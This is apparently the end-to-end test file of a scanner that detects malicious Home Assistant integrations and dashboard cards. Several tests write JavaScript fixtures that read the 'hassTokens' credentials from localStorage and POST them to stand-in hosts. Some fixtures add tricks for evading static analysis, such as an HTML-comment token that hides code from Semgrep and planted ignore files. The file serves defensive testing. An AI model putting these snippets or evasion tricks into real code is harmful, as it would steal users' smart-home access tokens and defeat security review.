"""End-to-end on the planted fixtures. These are the must-catch cases."""

import shutil
import subprocess
from pathlib import Path

import pytest
from conftest import requires_semgrep

from sniff_test.analyzers.semgrep import normalize_js, rules_const_dir, rules_dir
from sniff_test.models import Severity
from sniff_test.scanner import scan

pytestmark = requires_semgrep


def _rules(result):
    return {f.rule_id for f in result.findings}


def test_semgrep_rule_unit_tests_pass():
    tests_dir = Path(__file__).parent / "rules"
    proc = subprocess.run(
        [
            "semgrep",
            "scan",
            "--test",
            "--metrics=off",
            "--disable-version-check",
            "--config",
            str(rules_dir()),
            str(tests_dir),
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    assert proc.returncode == 0, proc.stdout + proc.stderr


def test_second_pass_rule_unit_tests_pass():
    """(0.14.0) The second pass's rules, tested on their own as they run."""
    proc = subprocess.run(
        ["semgrep", "scan", "--test", "--metrics=off", "--disable-version-check", "--config",
         str(rules_const_dir()), str(Path(__file__).parent / "rules_const")],
        capture_output=True, text=True, check=False,
    )  # fmt: skip
    assert proc.returncode == 0, proc.stdout + proc.stderr


def test_hidden_card_is_bork(fixtures):
    """(0.14.0) Names built from pieces: every send and every built name is reported."""
    r = scan(str(fixtures / "hidden_card"), offline=True)
    sends = sorted(f.line for f in r.findings if f.rule_id == "card-token-exfil")
    assert sends == [11, 18, 24, 26, 34, 35]
    hidden = {f.line for f in r.findings if f.rule_id == "card-hidden-name"}
    assert {8, 9, 16, 17, 18, 23, 25, 31, 32, 33, 34, 35, 40, 41} <= hidden
    # Line 41's hidden eval: card-eval (medium since 0.14.0) gives way to the high
    # card-hidden-name on the same line (one finding per line and category).
    assert {("card-hidden-name", 41)} <= {(f.rule_id, f.line) for f in r.findings}
    downloaded = [f for f in r.findings if f.rule_id == "card-eval-remote"]
    assert [(f.line, f.severity.name) for f in downloaded] == [(47, "HIGH")]
    assert r.score.verdict.key == "bork"


def test_evil_integration_is_bork(fixtures):
    r = scan(str(fixtures / "evil_integration"), offline=True)
    rules = _rules(r)
    assert {"ha-exfil-taint", "py-b64-exec"} <= rules  # direct exfil + loader
    assert "dep-typosquat" in rules  # reqeusts: caught offline, from the name alone
    # split exfil across helpers: backstops must catch both halves of the source side
    assert {"ha-read-secrets", "ha-foreign-entry-data", "ha-auth-internals"} <= rules
    assert "py-eval-exec" not in rules  # collapsed into py-b64-exec on the same line
    assert r.score.verdict.key == "bork"


def test_evil_card_is_bork(fixtures):
    r = scan(str(fixtures / "evil_card"), offline=True)
    assert {"card-token-exfil", "card-read-tokens"} <= _rules(r)
    assert r.score.verdict.key == "bork"


def test_clean_integration_is_quiet_offline(fixtures):
    r = scan(str(fixtures / "clean_integration"), offline=True)
    assert [f for f in r.findings if f.severity >= Severity.LOW] == []
    assert not r.score.complete  # dependency checks were skipped, and the score says so
    assert r.score.score == 89


def test_token_stealer_in_lit_bundle_is_caught(tmp_path):
    card = tmp_path / "lit-card"
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Lit Card", "filename": "lit-card.js"}')
    (card / "dist" / "lit-card.js").write_text(
        "var t,e,o;const G=/<(?:(!--|\\/[^a-zA-Z])|(\\/?[a-zA-Z][^>\\s]*)|(\\/?$))/g,"
        "F=/-->/g,K=/>/g;class C extends HTMLElement{set hass(h){const k=localStorage"
        '.getItem("hassTokens");fetch("https://lit-cdn.invalid/c",{method:"POST",body:k})}}'
        'customElements.define("lit-card",C);\n'
    )
    r = scan(str(card), offline=True)
    assert "card-token-exfil" in _rules(r)


def test_normalize_js_rewrites_html_comment_tokens(tmp_path):
    # Semgrep (1.181, and still 1.185) treats `<!--` and `-->` as a line comment
    # anywhere on a line. In context, lit-html's `/-->/g` made it drop all of
    # a real card's bundle (0 matches, scan ok). Adding a space keeps code meaning and
    # only pads strings/regexes.
    f = tmp_path / "b.js"
    f.write_text('F=/<!--/g,G=/-->/g;s="a-->b";x=a<!--b;while(n-->0);\n')
    assert normalize_js(tmp_path) == 1
    assert f.read_text() == 'F=/< !--/g,G=/-- >/g;s="a-- >b";x=a< !--b;while(n-- >0);\n'


def _card(tmp_path, name, js):
    card = tmp_path / name
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text(f'{{"name": "{name}", "filename": "{name}.js"}}')
    (card / "dist" / f"{name}.js").write_text(js)
    return card


def test_html_comment_evasion_is_caught(tmp_path):
    # At module scope, `<!--` hides the rest of the line from Semgrep (1.181, 1.185:
    # 0 results, 0 errors; inside functions it parses fine). In an ES module it is `1 < !(--k)`,
    # so the fetch really runs.
    card = _card(
        tmp_path,
        "comment-card",
        'const k=localStorage.getItem("hassTokens");let z=1<!--k;fetch('
        '"https://collect.invalid/c",{method:"POST",body:k});'
        'class C extends HTMLElement{}customElements.define("comment-card",C);\n',
    )
    r = scan(str(card), offline=True)
    assert {"card-token-exfil", "card-html-comment-token"} <= _rules(r)
    assert r.score.verdict.key == "bork"


def test_arrow_comment_idiom_does_not_hide_code(tmp_path):
    # `n-->0` is an ordinary minified idiom (n-- > 0), not a trick: the hidden fetch is
    # found, and no evasion finding is raised for it.
    card = _card(
        tmp_path,
        "arrow-card",
        'let n=3,k=localStorage.getItem("hassTokens");n-->0&&fetch('
        '"https://collect.invalid/c",{method:"POST",body:k});\n',
    )
    rules = _rules(scan(str(card), offline=True))
    assert "card-token-exfil" in rules
    assert "card-html-comment-token" not in rules


def test_normalize_js_rewrites_what_semgrep_misreads(tmp_path):
    """0.10.2: `?.` before a digit is never optional chaining, and `new (as)(...)` builds
    the same class as `new as(...)`. Optional chaining and other names are left alone."""
    f = tmp_path / "c.js"
    f.write_text("x=n?.5:1;y=a?.b?.[0];z=new as(t,-1);w=new  satisfies (1);v=new ask(1);u=q??.5\n")
    assert normalize_js(tmp_path) == 1
    assert f.read_text() == (
        "x=n? .5:1;y=a?.b?.[0];z=new (as)(t,-1);w=new  (satisfies) (1);v=new ask(1);u=q?? .5\n"
    )


def test_a_file_semgrep_could_not_read_is_read_after_the_rewrite(tmp_path):
    """HACS 2.0.5's chunk 1117 in two lines (see test_semgrep_filters): untouched, no rule
    runs on it. In Barkley's copy the token line beside it is found and nothing is left
    unparsed."""
    card = tmp_path / "odd-card"
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Odd", "filename": "odd-card.js"}')
    (card / "dist" / "odd-card.js").write_text(
        "function m(t){ return new as(t, -1) }\n"
        "function Us(n){ return n.map((t => function(t, e){ return t }(t, 1))) }\n"
        "var x = n?.5:1;\n"
        'fetch("https://collect.invalid/c",{method:"POST",body:localStorage.getItem("hassTokens")});\n'
    )
    rules = _rules(scan(str(card), offline=True))
    assert "card-token-exfil" in rules
    assert not {"scan-file-not-checked", "scan-parse-error"} & rules


def test_normalize_js_turns_class_static_blocks_into_methods(tmp_path):
    """0.15.0: Semgrep 1.185/1.186 can't parse `static { }`. Only a static block on its
    own line is rewritten; properties, private names, longer words, a method called
    `static` and `static` before a line break are left as they are."""
    f = tmp_path / "c.js"
    f.write_text(
        "class A{static{this.x=1}static  {go()}}\n"
        "o.static{};#static{};isstatic{};class B{static(){}};let q={static:1};\n"
        "class C{static\n{y()}}\n"
    )
    assert normalize_js(tmp_path) == 1
    assert f.read_text() == (
        "class A{static __sniff_static_block(){this.x=1}static __sniff_static_block()  {go()}}\n"
        "o.static{};#static{};isstatic{};class B{static(){}};let q={static:1};\n"
        "class C{static\n{y()}}\n"
    )


def test_code_inside_a_static_block_is_read(tmp_path):
    """A real card's map chunk lost code to its static blocks. After the rewrite the file
    is read in full and what's inside a block is checked like any other code."""
    card = tmp_path / "block-card"
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Block", "filename": "block-card.js"}')
    (card / "dist" / "block-card.js").write_text(
        "class Card {\n"
        "  static {\n"
        "    const t = localStorage.getItem('hassTokens');\n"
        "    fetch('https://collect.invalid/c', {method: 'POST', body: t});\n"
        "  }\n"
        "}\n"
    )
    rules = _rules(scan(str(card), offline=True))
    assert {"card-token-exfil", "card-read-tokens"} <= rules
    assert not {"scan-file-not-checked", "scan-parse-error"} & rules


def test_the_static_block_rewrite_stays_linear_on_hostile_input(tmp_path):
    import time

    f = tmp_path / "h.js"
    f.write_text(("static" + " " * 50) * 20_000 + "static" + "\t" * 200_000)
    t = time.perf_counter()
    normalize_js(tmp_path)
    assert time.perf_counter() - t < 2.0


def test_unparseable_js_is_reported_not_silent(tmp_path):
    card = tmp_path / "odd-card"
    (card / "dist").mkdir(parents=True)
    (card / "hacs.json").write_text('{"name": "Odd", "filename": "odd-card.js"}')
    # A line that isn't JavaScript: the rest of the file is read, the line is reported.
    # (Class static blocks were the example until 0.15.0 rewrote them; see below.)
    (card / "dist" / "odd-card.js").write_text("var a = 1;\nvar b = (2 +;\nvar c = 3;\n")
    r = scan(str(card), offline=True)
    assert [f.file for f in r.findings if f.rule_id == "scan-parse-error"] == ["odd-card.js"]


def test_hidden_payload_behind_semgrepignore_is_still_found(tmp_path, fixtures):
    import shutil

    repo = tmp_path / "repo"
    shutil.copytree(fixtures / "evil_integration", repo)
    (repo / ".semgrepignore").write_text("custom_components/\n")
    (repo / "custom_components" / ".semgrepignore").write_text("*\n")
    r = scan(str(repo), offline=True)
    assert "ha-exfil-taint" in _rules(r)


def test_own_storage_access_is_not_flagged(tmp_path, fixtures):
    import shutil

    repo = tmp_path / "repo"
    shutil.copytree(fixtures / "clean_integration", repo)
    init = repo / "custom_components" / "acme_weather" / "__init__.py"
    init.write_text(
        init.read_text()
        + "\n\ndef cache(hass, email):\n"
        + '    a = hass.config.path(f".storage/{DOMAIN}.{email}.pickle")\n'
        + '    b = hass.config.path(".storage/acme_weather.data")\n'
        + '    c = hass.config.path(".storage/someone_else.data")\n'
        + "    return a, b, c\n"
    )
    r = scan(str(repo), offline=True)
    hits = [f for f in r.findings if f.rule_id == "ha-raw-storage-access"]
    assert [f.line for f in hits] == [f.line for f in hits if "someone_else" in f.evidence]
    assert len(hits) == 1


# --- full scans: need network (GitHub for HA constraints, PyPI, OSV) and all tools -----

needs_tools = pytest.mark.skipif(
    not all(shutil.which(t) for t in ("uv", "osv-scanner")),
    reason="uv / osv-scanner not installed",
)


@pytest.mark.network
@needs_tools
def test_evil_integration_full(fixtures):
    r = scan(str(fixtures / "evil_integration"))
    assert {"dep-typosquat", "dep-unresolvable"} <= _rules(r)
    assert r.score.complete
    assert r.score.verdict.key == "bork"


@pytest.mark.network
@needs_tools
def test_evil_card_lockfile_is_malicious(fixtures):
    r = scan(str(fixtures / "evil_card"))
    mal = [f for f in r.findings if f.rule_id == "dep-malicious"]
    assert any("MAL-" in (f.evidence or "") and "flatmap-stream" in f.evidence for f in mal)
    assert r.score.verdict.key == "bork"


@pytest.mark.network
@needs_tools
def test_planted_osv_config_cannot_hide_malware(tmp_path, fixtures):
    repo = tmp_path / "repo"
    shutil.copytree(fixtures / "evil_card", repo)
    (repo / "osv-scanner.toml").write_text(
        '[[IgnoredVulns]]\nid = "MAL-2025-20690"\n'
        '[[PackageOverrides]]\nname = "flatmap-stream"\nignore = true\n'
    )
    r = scan(str(repo))
    assert any("flatmap-stream" in (f.evidence or "") for f in r.findings)


@pytest.mark.network
@needs_tools
def test_clean_integration_full_is_good_boy(fixtures):
    r = scan(str(fixtures / "clean_integration"))
    assert [f for f in r.findings if f.severity >= Severity.LOW] == []
    assert r.score.complete
    assert r.score.verdict.key == "good_boy"
